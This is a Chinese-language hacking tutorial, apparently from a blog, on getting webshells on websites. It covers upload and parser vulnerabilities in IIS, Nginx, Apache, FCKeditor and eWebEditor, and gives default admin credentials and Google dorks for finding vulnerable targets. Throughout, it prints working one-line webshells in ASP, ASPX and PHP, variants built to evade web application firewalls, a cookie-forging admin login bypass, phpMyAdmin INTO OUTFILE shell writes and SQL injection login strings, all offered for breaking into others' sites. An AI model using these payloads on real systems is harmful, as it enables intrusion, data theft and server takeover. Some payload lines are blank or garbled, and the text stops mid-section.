<p>程序在接收到文件后，对目录判断，如果服务器不存在pentest.asp目录，将会建立此目录，然后再将图片一句话密码文件写入pentest.asp目录，如果Web容器为IIS 6.0，那么网页木马会被解析。</p>
<h4 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h4><p>在ASP程序中最常见，也就是%00将后面的字符都截断了，比如上传文件名为1.asp%00xxser.jpg。</p>
<p>实际操作过程中，利用Burp Suite的Repeater中的HEX选项卡可以进行这样的操作。</p>
<p>截断上传漏洞不仅出现在ASP程序上，在PHP、JSP程序中也存在这样的问题。</p>
<p>0x00不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截断上传漏洞。</p>
<h1 id="第八篇-上传漏洞之文本编辑器上传"><a href="#第八篇-上传漏洞之文本编辑器上传" class="headerlink" title="第八篇-上传漏洞之文本编辑器上传"></a>第八篇-上传漏洞之文本编辑器上传</h1><h2 id="Oday"><a href="#Oday" class="headerlink" title="Oday"></a>Oday</h2><p>常见的文本编辑器有CKEditor，Ewebeditor，UEditor，KindEditor，XHeditor等。其包含的功能类似，比如，图片上传、视频上传、远程下载等。</p>
<p>使用这类编辑器减少了程序开发的时间，但也存在通用性漏洞带来的危害</p>
<p>以FCKeditor（现已更名为CKEditor）为例，其存在如下漏洞</p>
<h2 id="一、敏感信息暴露"><a href="#一、敏感信息暴露" class="headerlink" title="一、敏感信息暴露"></a>一、敏感信息暴露</h2><h3 id="1-1-查看版本信息"><a href="#1-1-查看版本信息" class="headerlink" title="1.1 查看版本信息"></a>1.1 查看版本信息</h3><p>/FCKeditor/editor/dialog/fck_about.html</p>
<h3 id="1-2-默认上传页面"><a href="#1-2-默认上传页面" class="headerlink" title="1.2 默认上传页面"></a>1.2 默认上传页面</h3><p>/FCKeditor/editor/filemanager/browser/default/browser.html</p>
<p>/FCKeditor/editor/filemanager/browser/default/connectors/test.html</p>
<p>/FCKeditor/editor/filemanager/upload/test.html</p>
<p>/FCKeditor/editor/filemanager/connectors/test.html</p>
<p>/FCKeditor/editor/filemanager/connectors/uploadtest.html</p>
<h3 id="1-3-其他敏感文件"><a href="#1-3-其他敏感文件" class="headerlink" title="1.3 其他敏感文件"></a>1.3 其他敏感文件</h3><p>/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx</p>
<p>/FCKeditor/editor/filemanager/connectors/asp/connector.asp</p>
<p>/FCKeditor/editor/filemanager/connectors/php/connector.php</p>
<h2 id="二、黑名单策略错误"><a href="#二、黑名单策略错误" class="headerlink" title="二、黑名单策略错误"></a>二、黑名单策略错误</h2><p>在FCKeditor&lt;=2.4.3版本中采用的是黑名单机制，在config.asp文件中有对此黑名单的定义。</p>
<p>在这个黑名单中过滤了一些常见的文件扩展名，但疏忽了asa、cer等未知风险扩展名。</p>
<h2 id="三、任意文件上传漏洞"><a href="#三、任意文件上传漏洞" class="headerlink" title="三、任意文件上传漏洞"></a>三、任意文件上传漏洞</h2><p>在FCKeditor2.4.2及其以下的版本中，都存在任意文件上传漏洞，比如文件upload.php</p>
<p>在Burp Suite中拦截上传信息，并将请求地址改为upload.php?Type=Media上传。</p>
<p>在FCKeditor中还存在其他的漏洞，例如，ASP.NET二次上传，建立畸形文件夹等漏洞。</p>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>关于各种版本的FCKeditor，上传利用地址形式如下：</p>
<p>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors</p>
<p>JSP版本：/jsp/connector</p>
<p>ASP版本：/asp/connector</p>
<p>ASPX版本：/aspx/connector</p>
<p>cfm版本：/cfm/connector</p>
<p>由于FCKeditor的典型目录结构是“UserFiles/Image/”,因此，上传的WebShell地址格式为“UserFiles/Image（File或Flash）/+文件名称”。例如：<a href="http://www.x.com/UserFiles/Flash/Browser.jsp" target="_blank" rel="noopener">http://www.x.com/UserFiles/Flash/Browser.jsp</a></p>
<p>eWebEditor</p>
<p>下载eWebEditor的默认数据库文件：db/ewebeditor.mdb</p>
<p>默认后台：ewebeditor/admin_login.asp,默认用户名和密码admin/admin</p>
<p>样式管理：/system/editor/admin_style.asp</p>
<p>Dvbbs 8.2中数据库的默认地址：data/dvbbs8.mdb</p>
<h1 id="特别篇-主流网站程序Oday大全以及拿shell思路"><a href="#特别篇-主流网站程序Oday大全以及拿shell思路" class="headerlink" title="特别篇-主流网站程序Oday大全以及拿shell思路"></a>特别篇-主流网站程序Oday大全以及拿shell思路</h1><h2 id="版权和内容说明："><a href="#版权和内容说明：" class="headerlink" title="版权和内容说明："></a>版权和内容说明：</h2><p>这篇文章不是本站编写,是从网络上摘抄的,但是经过了本站的改写优化,并将内容,格式规范化。</p>
<p>本篇说明：这篇文章结合了前辈们前几年一路挖掘出来的主流程序漏洞以及<a href="http://www.yuntest.org/archives/tag/si-lu/" target="_blank" rel="noopener">思路</a>, 小编写在前面是想让大家大致了解一下,因为《<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>课程》以后的内容,就是围绕着本篇所涉及的内容进行深度逻辑原理剖析。</p>
<p>这是一篇比较完全的基本渗透笔记。看不懂没关系,后面会一一讲解不过本章的内容读者们要尽量保存,可能会在拿站的时候应用到呢！</p>
<h2 id="常见网站程序asp类："><a href="#常见网站程序asp类：" class="headerlink" title="常见网站程序asp类："></a>常见网站程序asp类：</h2><p>foosun(风讯)</p>
<p>kesion(科汛)</p>
<p>newasp(新云)</p>
<p>乔客CreateLive(创力)</p>
<p>5uCMSKingCMS</p>
<p>DvBBS(动网)</p>
<p>BBSxp[博客]zblog</p>
<h2 id="PHP类："><a href="#PHP类：" class="headerlink" title="PHP类："></a>PHP类：</h2><p>DeDeCms（织梦）</p>
<p>ECMS（帝国）</p>
<p>PHPCMS</p>
<p>PHP168</p>
<p>HBcms（宏博）SupeSite</p>
<p>CMSware(思维)Joomla!</p>
<p>[BBS]Discuz!</p>
<p>[BBS]phpWind[SNS]UCenterHome</p>
<p>[SNS]ThinkSNS[商城]EcShop</p>
<p>[商城]ShopEx[博客]WordPress</p>
<p>[维基]HDWiki</p>
<p>[微博]PHPsay[DIGG]PBdigg</p>
<h2 id="PHP程序来源默认绝对路径"><a href="#PHP程序来源默认绝对路径" class="headerlink" title="PHP程序来源默认绝对路径"></a>PHP程序来源默认绝对路径</h2><p>开源系统 数据库配置文件名 文件名所在的目录</p>
<p>Discuz! config.inc.php ./ config.inc.php</p>
<p>Phpcms config.inc.php ./include/config.inc.php</p>
<p>Wodpress wp-config.php ./ wp-config.php</p>
<p>Phpwind sqlconfig.php ./data/sqlconfig.php</p>
<p>phpweb config.inc.php ./config.inc.php</p>
<p>Php168v6 mysql_config.php ./php168/ mysql_config.php</p>
<p>Shopex config.php ./config/config.php</p>
<p>Ecshop config.php ./data/config.php</p>
<p>Joomla configuration.php ./ configuration.php</p>
<p>UCenter config.inc.php ./data/config.inc.php</p>
<p>EmpireCMS config.php ./e/class/config.php</p>
<p>Dedecms common.inc.php .data/common.inc.php</p>
<p>Zen Cart configure.php ./includes/configure.php</p>
<p>Mediawiki localsettints.php ./config/localsettints.php</p>
<p>Ecshop config.php ./data/config.php</p>
<p>osCommerce configure.php ./includes/configure.php</p>
<h2 id="【-谷歌语法-】"><a href="#【-谷歌语法-】" class="headerlink" title="【 谷歌语法 】"></a>【 谷歌语法 】</h2><p>site：可以限制你搜索范围的域名.</p>
<p>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.</p>
<p>intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)</p>
<p>intitle: 查包含关键词的页面，一般用于<a href="http://www.yuntest.org/archives/tag/she-gong/" target="_blank" rel="noopener">社工</a>别人的webshell密码</p>
<p>filetype：搜索文件的后缀或者扩展名</p>
<p>intitle：限制你搜索的网页标题.</p>
<p>link: 可以得到一个所有包含了某个指定URL的页面列表.</p>
<p>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p>
<p>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p>
<p>查找可注入点：site:域名 inurl:aspx|jsp|php|asp</p>
<p>查找上传漏洞：site:域名 inurl:file|load|editor|Files</p>
<p>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
<p>存在的数据库：site:域名 filetype:mdb|asp|#</p>
<p>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</p>
<p>迂回策略入侵：inurl:cms/data/templates/images/index/</p>
<p>网络设备关键词：intext:WEB Management Interface for H3C SecPath Series</p>
<h2 id="【-一句话木马-】"><a href="#【-一句话木马-】" class="headerlink" title="【 一句话木马 】"></a>【 一句话木马 】</h2><p>asp一句话木马：&lt;%eval request(“x”)%&gt;</p>
<p>php一句话木马：</p>
<p>aspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;</p>
<p>网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;</p>
<p>一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;</p>
<p>过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;</p>
<p>asp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%</p>
<p>能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</p>
<p>突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;</p>
<p>elong过安全狗的php一句话：</p>
<p>后台常用写入php一句话（密码x）：</p>
<p>&lt;?</p>
<p>$fp = @fopen(“c.php”, ‘a’);</p>
<p>@fwrite($fp, ‘&lt;‘.’?php’.”rnrn”.’eval($_POST[x])’.”rnrn?”.”&gt;rn”);</p>
<p>@fclose($fp);</p>
<p>?&gt;</p>
<p>高强度php一句话：</p>
<p>新型变异PHP一句话(密码b4dboy):</p>
<p>($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</p>
<p>突破安全狗的aspx一句话：&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;</p>
<p>&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;</p>
<p>突破护卫神，保护盾一句话：</p>
<p>许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。</p>
<p>改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉</p>
<p>这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。</p>
<p>PHP高强度一句话：</p>
<p>菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c</p>
<p>菜刀连接 躲避检测 密码：c</p>
<p>##【 解析漏洞总结 】</p>
<p>IIS 6.0</p>
<p>目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码IIS6.0 会将 xx.jpg 解析为 asp 文件。</p>
<p>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)</p>
<p>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。</p>
<p>默认解析：/xx.asa /xx.cer /xx.cdx</p>
<p>IIS6.0 默认的可执行文件除了 asp 还包含这三种</p>
<p>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg</p>
<p>IIS 7.0/ IIS 7.5/ Nginx &lt;8.03</p>
<p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p>
<p>e.g.</p>
<p>copy xx.jpg/b + yy.txt/a xy.jpg</p>
<p>/b 即二进制[binary]模式</p>
<p>/a 即ascii模式 xx.jpg正常图片文件</p>
<p>yy.txt 内容 ’);?&gt;</p>
<p>意思为写入一个内容为 名称为shell.php的文件</p>
<p>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
<p>.然后就在图片目录下生成一句话木马 shell.php 密码 cmd</p>
<h2 id="【-ewebeditor编辑器-】"><a href="#【-ewebeditor编辑器-】" class="headerlink" title="【 ewebeditor编辑器 】"></a>【 ewebeditor编辑器 】</h2><p>默认后台：ewebeditor/admin_login.asp</p>
<p>帐号密码：admin admin</p>
<p>样式设计：ewebeditor/admin_style.asp</p>
<p>查看版本：ewebeditor/dialog/about.html</p>
<p>数据库路径：db/ewebeditor.mdb db/%23ewebeditor.mdb db/%23ewebeditor.asp ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)</p>
<p>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..</p>
<p>跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=.. (dir为列目录, ..为返回上层目录)，形式:dir ../..</p>
<p>点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)</p>
<h2 id="ewebeditor5-5版本"><a href="#ewebeditor5-5版本" class="headerlink" title="( ewebeditor5.5版本 )"></a>( ewebeditor5.5版本 )</h2><p>默认后台：ewebeditor/admin/login.asp</p>
<p>帐号密码：admin 198625</p>
<p>数据库路径：data/%23sze7xiaohu.mdb</p>
<p>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../</p>
<p>调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup</p>
<p>( ewebeditor3.8 php版本 )</p>
<p>默认后台：eWebEditor/admin/login.php</p>
<p>首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：</p>
<p>javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));</p>
<p>接着访问文件：ewebeditor/admin/default.php 就可以直接进入后台了。</p>
<p>( ewebeditor编辑器exp手册 )</p>
<p>有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试</p>
<p>一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg</p>
<p>二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。</p>
<p>页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用<a href="http://www.yuntest.org/archives/tag/gong-ju/" target="_blank" rel="noopener">工具</a>浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。</p>
<h2 id="【-fckeditor编辑器-】"><a href="#【-fckeditor编辑器-】" class="headerlink" title="【 fckeditor编辑器 】"></a>【 fckeditor编辑器 】</h2><p>查看版本：fckeditor/editor/dialog/fck_about.html</p>
<p>编辑器页面：FCKeditor/_samples/default.html</p>
<p>上传页面：fckeditor/editor/filemanager/connectors/test.html</p>
<p>遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/</p>
<p>编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp</p>
<p>查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=</p>
<p><strong>( 拿shell方法总结 )</strong></p>
<p>ASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。</p>
<p>一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell</p>
<p>二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg</p>
<p>三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx</p>
<p>四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次</p>
<p>五：成功访问别人的一句话木马页面，<a href="http://xx.com/UploadFilesEditorFilefile/2.asp;2(1).jpg" target="_blank" rel="noopener">http://xx.com/UploadFilesEditorFilefile/2.asp;2(1).jpg</a> 但不知道密码</p>
<p><a href="http://xx.com/UploadFilesEditorFilefile2_asp;2.jpg" target="_blank" rel="noopener">http://xx.com/UploadFilesEditorFilefile2_asp;2.jpg</a> 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。</p>
<p>六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php 例如：<a href="http://www.xxx.com/iges/php.jpg/.php" target="_blank" rel="noopener">http://www.xxx.com/iges/php.jpg/.php</a></p>
<p>( 建立文件夹 . 变 _ 的突破方法 )</p>
<p>利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。</p>
<p>注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！</p>
<p>1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html</p>
<p>2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”</p>
<p>3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp</p>
<p>4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探</p>
<p>5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp</p>
<p>6.然后点击右侧的：run to completion</p>
<p>7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了</p>
<h2 id="【-linux-】"><a href="#【-linux-】" class="headerlink" title="【 linux 】"></a>【 linux 】</h2><p>解析格式：1.php.xxx (xxx可以是任意)</p>
<p>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>当做PHP脚本解析。</p>
<p>辨别linux系统方法：例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="noopener">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统.</p>
<h2 id="【-旁注-】"><a href="#【-旁注-】" class="headerlink" title="【 旁注 】"></a>【 旁注 】</h2><p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="noopener">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx</p>
<p>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
<h2 id="【-phpmyadmin-】"><a href="#【-phpmyadmin-】" class="headerlink" title="【 phpmyadmin 】"></a>【 phpmyadmin 】</h2><p>查看版本：test.php 或 phpinfo.php</p>
<p>默认账号密码：root root</p>
<p>万能帐号密码：’localhost’@’@” 密码空</p>
<p>拿shell第一种方法：</p>
<p>CREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );</p>
<p>INSERT INTO mysql.darkmoon (darkmoon1 ) VALUES (‘’);</p>
<p>SELECT darkmoon1 FROM darkmoon INTO OUTFILE ‘d:/wamp/www/darkmoon.php’;</p>
<p>DROP TABLE IF EXISTS darkmoon;</p>
<p>拿shell第二种方法：</p>
<p>Create TABLE moon (darkmoon text NOT NULL);</p>
<p>Insert INTO moon (darkmoon) VALUES(‘’);</p>
<p>select darkmoon from moon into outfile ‘d:/wamp/www/darkmoon2.php’;</p>
<p>Drop TABLE IF EXISTS moon;</p>
<p>拿shell第三种方法：</p>
<p>select ‘’INTO OUTFILE ‘d:/wamp/www/darkmoon3.php’</p>
<p>拿shell第四种方法</p>
<p>select ‘’ INTO OUTFILE ‘d:/wamp/www/darkmoon4.php’</p>
<p>127.0.0.1/darkmoon4.php?cmd=net user</p>
<p>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。</p>
<h3 id="phpmyadmin脱裤"><a href="#phpmyadmin脱裤" class="headerlink" title="phpmyadmin脱裤"></a>phpmyadmin脱裤</h3><p>在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。</p>
<p>修改mysql默认的root用户名方法:</p>
<p>进入phpmyadmin,进入mysql表,执行sql语句</p>
<p>1.update user set user=’你的新root用户名’ where user=’root’;</p>
<p>2.flush privileges;</p>
<p>例如：</p>
<p>用root身份登入，进入mysql库，修改user表即可。</p>
<p>1.use mysql;</p>
<p>2.mysql&gt;update user set user=’newName’ where user=’root’;</p>
<p>3.mysql&gt; flush privileges;</p>
<h3 id="【-万能密码-】"><a href="#【-万能密码-】" class="headerlink" title="【 万能密码 】"></a>【 万能密码 】</h3><p>( php )</p>
<p>帐号：’ UNION Select 1,1,1 FROM admin Where ”=’</p>
<p>密码：1</p>
<p>( asp )</p>
<p>‘xor</p>
<p>‘or’=’or’</p>
<p>‘or”=”or”=’</p>
<p>‘or ‘1’=’1’or ‘1’=’1</p>
<p>‘or 1=1/*</p>
<h3 id="【-批量关键词-】"><a href="#【-批量关键词-】" class="headerlink" title="【 批量关键词 】"></a>【 批量关键词 】</h3><p>inurl:asp?id=</p>
<p>inurl:detail.php?</p>
<p>CompHonorBig.asp?id= 很不错的的一个搜索注入点</p>
<p>inurl:show.asp? 非常强大</p>
<p>site:www.yuming.com</p>
<p>inurl:articleshow.asp?articleid=数字</p>
<p>inurl:szwyadmin/login.asp</p>
<p>inurl:asp?id=1 intitle:政府</p>
<p>杭州 inurl:Article_Class2.asp?</p>
<h3 id="【-木马后门-】"><a href="#【-木马后门-】" class="headerlink" title="【 木马后门 】"></a>【 木马后门 】</h3><p>1.TNTHK小组内部版 —— 存在关键词后门，随便输入一个错的密码，右键查看源文件，找到错误关键词后面的font，在font后面的就是正确密码。</p>
<p>2.不灭之魂—不死僵尸变种 —— 用这款工具专门爆这款大马的密码：爆不灭之魂密码</p>
<p>3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk</p>
<h3 id="【-安全狗-】"><a href="#【-安全狗-】" class="headerlink" title="【 安全狗 】"></a>【 安全狗 】</h3><h4 id="1-过注入"><a href="#1-过注入" class="headerlink" title="1.过注入"></a>1.过注入</h4><p>方法一：a.asp?aaa=%00&amp;id=sql语句</p>
<p>方法二： a.asp?id=sql语句 里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin</p>
<h4 id="2-过大马被阻拦访问"><a href="#2-过大马被阻拦访问" class="headerlink" title="2.过大马被阻拦访问"></a>2.过大马被阻拦访问</h4><p>方法一：上传一个大马 然后访问<a href="http://sss.com/dama.asp" target="_blank" rel="noopener">http://sss.com/dama.asp</a> ; 访问后出现拦截。</p>
<p>那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： &lt;!–#include file=”dama.jpg” –&gt; 这样再访问da.asp 就不会被拦截了。</p>
<h4 id="3-过菜刀连接一句话被拦截"><a href="#3-过菜刀连接一句话被拦截" class="headerlink" title="3.过菜刀连接一句话被拦截"></a>3.过菜刀连接一句话被拦截</h4><p>方法一：不用菜刀连接一句话，用别的一句话连接端。</p>
<p>方法二：中转下连接菜刀，把过滤掉的词替换掉。</p>
<h3 id="【-本地构造上传漏洞-】"><a href="#【-本地构造上传漏洞-】" class="headerlink" title="【 本地构造上传漏洞 】"></a>【 本地构造上传漏洞 】</h3><p>寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：</p>
<p>1.filename (文件名称) 在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。</p>
<p>2.filepath (文件路径) 在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。</p>
<p>当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！</p>
<p>不行就利用本地上传漏洞构造上传！例如上传页面是：<a href="http://www.xx.com/upfile_other.asp" target="_blank" rel="noopener">http://www.xx.com/upfile_other.asp</a></p>
<p>1.右键查看源文件，找到这段代码：</p>
<p>把以上代码中actino处的路径补全！即：</p>
<p>2.再找到这段代码：</p>
<p>利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即： 注意：冒号后面有空格！</p>
<p>3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！</p>
<p>4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！</p>
<h3 id="【-利用双文件上传拿shell-】"><a href="#【-利用双文件上传拿shell-】" class="headerlink" title="【 利用双文件上传拿shell 】"></a>【 利用双文件上传拿shell 】</h3><p>因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。</p>
<p>当系统验证cookie的时候，就要用到火狐浏览器了，<a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a>网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。</p>
<p>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。</p>
<p>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！</p>
<p>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://www.xxxx.com/upfile_other.asp</p>
<p>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</p>
<p>【 数据库备份抓包改包NC提交拿shell 】</p>
<p>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！</p>
<p>在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！</p>
<p>开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！</p>
<p>再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt</p>
<h3 id="【-本地构造数据库备份突破拿shell-】"><a href="#【-本地构造数据库备份突破拿shell-】" class="headerlink" title="【 本地构造数据库备份突破拿shell 】"></a>【 本地构造数据库备份突破拿shell 】</h3><p>当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！</p>
<p>首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa</p>
<p>找到“</p>
<p>“将路径补全”</p>
<p>”</p>
<p>最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。</p>
<p>因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！</p>
<h3 id="【-本地构造限制上传类型漏洞-】"><a href="#【-本地构造限制上传类型漏洞-】" class="headerlink" title="【 本地构造限制上传类型漏洞 】"></a>【 本地构造限制上传类型漏洞 】</h3><p>一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”</p>
<p>这时通过这个方法一般都能成功，首先保存到本地1.asp 放到小旋风的目录下，然后找到以下这段代码：</p>
<p>alert(“请点击浏览按钮，选择您要上传的jpg或gif文件!”)</p>
<p>myform.file1.focus;</p>
<p>return (false);</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>str= myform.file1.value;</p>
<p>strs=str.toLowerCase();</p>
<p>lens=strs.length;</p>
<p>extname=strs.substring(lens-4,lens);</p>
<p>if(extname!=”.jpg” &amp;&amp; extname!=”.gif”)</p>
<p>{</p>
<p>alert(“请选择jpg或gif文件!”);</p>
<p>看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”) 改为： if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)</p>
<p>然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。</p>
<h3 id="【-抓包改包NC提交拿shell-】"><a href="#【-抓包改包NC提交拿shell-】" class="headerlink" title="【 抓包改包NC提交拿shell 】"></a>【 抓包改包NC提交拿shell 】</h3><p>1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。</p>
<p>2.将木马的抓包数据复制到文本文件中。例如：1.txt</p>
<p>3.将路径补全：</p>
<p>filepath截断法：</p>
<p>uploadfile/路径后添加1.asp空格 (16进制下面将20改为00)</p>
<p>filename自定义名称：</p>
